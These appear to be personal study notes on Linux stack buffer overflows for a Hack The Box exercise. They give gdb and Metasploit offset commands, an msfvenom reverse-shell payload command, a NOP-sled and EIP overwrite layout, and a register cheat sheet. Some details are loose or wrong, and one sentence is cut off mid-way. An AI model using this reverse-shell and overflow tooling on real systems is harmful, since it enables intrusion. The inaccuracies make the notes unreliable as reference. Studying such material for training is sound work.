# Binary Exploitation QuickNotes

## Notes
- Vulnerable functions include strcpy, gets, sprintf, scanf, strcat.
- To inspect assembly of a program in gdb use `disassemble main`
- Test for buffer overflows by using `run $(python -c "print '\x55' * 1200")` within gdb
- Offsets can be determined by generating a pattern then sending it to the program via gdb in conjunction with the metasploit script  used like so `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt`. After which you will need to copy and paste or feed the data into the program via the `run` command seen in the last step.
- A memory address will be shown in gdb after the segmentation fault, this will be fed into the pattern offset metasploit script like so `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569`, this will produce the exact offset location which will allow for stack based attacks.
- To find exact memory addressess use `info registers <your-register>` ebp is the beginning of the stack, eip is what we seek to execute code by pointing to a new memory register.
- Next onto generating shellcode via metasploit: `msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c` by default this will be some small amount of memory, however 
- In order for this code to execute we will need to calculate exactly where to put it into the buffer, it is preferable to put it at the end of the buffer and then overwrite the eip which will store our code safely, better to have more than less so we over guess how many bytes the shellcode will take up in memory.
- If a buffer of 1036 bytes existed, we could use the following to create a memory allocation system for the shellcode, NOPs are just used to make sure the shellcode executes cleanly
```
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```


## Register Cheatsheet

### Data
32-bit Register	64-bit Register	Description
EAX	RAX	Accumulator is used in input/output and for arithmetic operations
EBX	RBX	Base is used in indexed addressing
ECX	RCX	Counter is used to rotate instructions and count loops
EDX	RDX	Data is used for I/O and in arithmetic operations for multiply and divide operations involving large values
### Pointer
32-bit Register	64-bit Register	Description
EIP	RIP	Instruction Pointer stores the offset address of the next instruction to be executed
ESP	RSP	Stack Pointer points to the top of the stack
EBP	RBP	Base Pointer is also known as Stack Base Pointer or Frame Pointer thats points to the base of the stack

## Programs
### Bow.c
Courtisy of Hack the Box, uses a single function to copy a string from a single function to a character buffer. Only works with address space layout randomization turned off. So effectively useless on in production/modern systems ( post 80s )



